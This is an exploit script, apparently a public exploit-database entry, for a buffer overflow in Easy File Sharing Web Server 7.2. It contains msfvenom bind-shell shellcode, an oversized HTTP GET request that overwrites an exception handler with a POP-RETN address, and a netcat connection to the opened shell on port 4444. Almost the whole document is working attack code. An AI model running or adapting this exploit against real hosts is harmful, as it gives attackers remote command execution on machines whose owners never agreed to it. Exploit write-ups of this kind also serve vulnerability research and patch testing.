#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 Buffer Overflow
# Date: January 29, 2017
# Exploit Author: cmaddy
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/download.php
# Version: 7.2
# Tested on: Windows 10

from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from struct import pack
from time import sleep
from subprocess import call

host = argv[1]

# msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed -f c
# 718 bytes
# This doesn't won't work for you :)

shellcode = ("\x88\xe5\xdb\xd9\xd9\x75\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x79\x6c\x68\x68\x4e\x62\x57\x70\x55\x50\x75\x50\x45\x30\x4f"
"\x79\x69\x75\x74\x71\x69\x50\x73\x54\x6c\x4b\x62\x70\x36\x50"
"\x4c\x4b\x46\x32\x54\x4c\x6e\x6b\x72\x72\x66\x74\x6e\x6b\x50"
"\x72\x57\x58\x36\x6a\x48\x37\x73\x7a\x65\x76\x50\x31\x6b\x4f"
"\x6c\x6c\x65\x6c\x33\x51\x63\x4c\x66\x62\x44\x6c\x55\x70\x6b"
"\x71\x38\x4f\x66\x6d\x56\x61\x49\x57\x6d\x33\x6b\x42\x72\x72"
"\x62\x77\x4c\x4b\x53\x62\x62\x30\x4e\x6b\x42\x6a\x67\x4c\x4e"
"\x6b\x32\x6c\x44\x51\x63\x48\x38\x63\x47\x38\x46\x61\x5a\x71"
"\x32\x71\x6c\x4b\x31\x49\x51\x30\x73\x31\x6e\x33\x4c\x4b\x47"
"\x39\x77\x68\x48\x62\x34\x7a\x51\x59\x6e\x6b\x54\x74\x6c\x4b"
"\x77\x71\x6e\x36\x45\x61\x39\x6f\x4c\x6c\x5a\x61\x5a\x6f\x36"
"\x6d\x77\x71\x38\x47\x70\x38\x4b\x50\x54\x45\x59\x66\x33\x33"
"\x61\x6d\x39\x68\x55\x6b\x73\x4d\x35\x74\x54\x35\x68\x64\x61"
"\x48\x4e\x6b\x63\x68\x61\x34\x47\x71\x69\x43\x45\x36\x6c\x4b"
"\x34\x4c\x70\x4b\x6d\x4b\x72\x78\x55\x4c\x56\x61\x47\x43\x4f"
"\x6b\x55\x54\x6e\x6b\x46\x61\x4a\x70\x4f\x79\x77\x34\x51\x34"
"\x51\x34\x51\x4b\x31\x4b\x75\x31\x53\x69\x70\x5a\x32\x71\x6b"
"\x4f\x49\x70\x31\x4f\x33\x6f\x63\x6a\x4e\x6b\x44\x52\x68\x6b"
"\x4e\x6d\x61\x4d\x32\x48\x54\x73\x70\x32\x67\x70\x55\x50\x63"
"\x58\x70\x77\x34\x33\x50\x32\x53\x6f\x43\x64\x52\x48\x52\x6c"
"\x31\x67\x77\x56\x53\x37\x4b\x4f\x79\x45\x4c\x78\x5a\x30\x73"
"\x31\x77\x70\x33\x30\x55\x79\x78\x44\x70\x54\x56\x30\x53\x58"
"\x56\x49\x6b\x30\x62\x4b\x53\x30\x69\x6f\x38\x55\x43\x5a\x35"
"\x58\x62\x79\x52\x70\x4b\x52\x49\x6d\x63\x70\x70\x50\x37\x30"
"\x32\x70\x63\x58\x49\x7a\x64\x4f\x6b\x6f\x69\x70\x69\x6f\x59"
"\x45\x6f\x67\x43\x58\x74\x42\x53\x30\x37\x61\x53\x6c\x6d\x59"
"\x59\x76\x50\x6a\x54\x50\x53\x66\x53\x67\x35\x38\x78\x42\x4b"
"\x6b\x45\x67\x52\x47\x49\x6f\x7a\x75\x76\x37\x51\x78\x4c\x77"
"\x6b\x59\x47\x48\x49\x6f\x69\x6f\x4b\x65\x56\x37\x75\x38\x63"
"\x44\x7a\x4c\x47\x4b\x59\x71\x69\x6f\x79\x45\x52\x77\x4f\x67"
"\x43\x58\x63\x45\x72\x4e\x50\x4d\x45\x31\x4b\x4f\x4e\x35\x35"
"\x38\x63\x53\x50\x6d\x71\x74\x53\x30\x4e\x69\x6b\x53\x46\x37"
"\x73\x67\x73\x67\x70\x31\x79\x66\x33\x5b\x44\x52\x51\x49\x70"
"\x56\x58\x62\x79\x6d\x33\x56\x38\x47\x52\x64\x56\x64\x47\x4c"
"\x75\x51\x56\x61\x6e\x6d\x72\x64\x44\x64\x46\x70\x69\x56\x65"
"\x50\x43\x74\x62\x74\x62\x70\x71\x46\x56\x36\x33\x66\x62\x66"
"\x42\x76\x52\x6e\x31\x46\x56\x36\x52\x73\x61\x46\x71\x78\x63"
"\x49\x7a\x6c\x35\x6f\x4d\x56\x59\x6f\x38\x55\x6e\x69\x6d\x30"
"\x30\x4e\x32\x76\x71\x56\x6b\x4f\x46\x50\x31\x78\x67\x78\x4d"
"\x57\x55\x4d\x65\x30\x4b\x4f\x6b\x65\x6d\x6b\x68\x70\x6c\x75"
"\x79\x32\x73\x66\x53\x58\x6f\x56\x4e\x75\x6f\x4d\x4f\x6d\x6b"
"\x4f\x68\x55\x35\x6c\x37\x76\x63\x4c\x56\x6a\x4b\x30\x6b\x4b"
"\x79\x70\x73\x45\x67\x75\x6d\x6b\x73\x77\x67\x63\x54\x32\x72"
"\x4f\x63\x5a\x53\x30\x51\x43\x59\x6f\x4a\x75\x41\x41")

crash = "\x90" * 3
crash += shellcode + "\x90" * (4070 - len(shellcode))
# POP POP POP POP RETN
crash += pack('<L', 0x10019CE1)
crash += "C" * 23

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)

print '[+] Trying to exploit {}...'.format(host)

try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, 80))
        print '[+] Sending payload...'
        s.send(payload)
        s.close()
        print '[+] Trying to connect to target...\n'
        try:
                sleep(2)
                call(['nc', host, '4444'])
        except:
                print '[!] Whoops!! Something went wrong?'
except:
        print '[!] Whoops!! Something went wrong?'
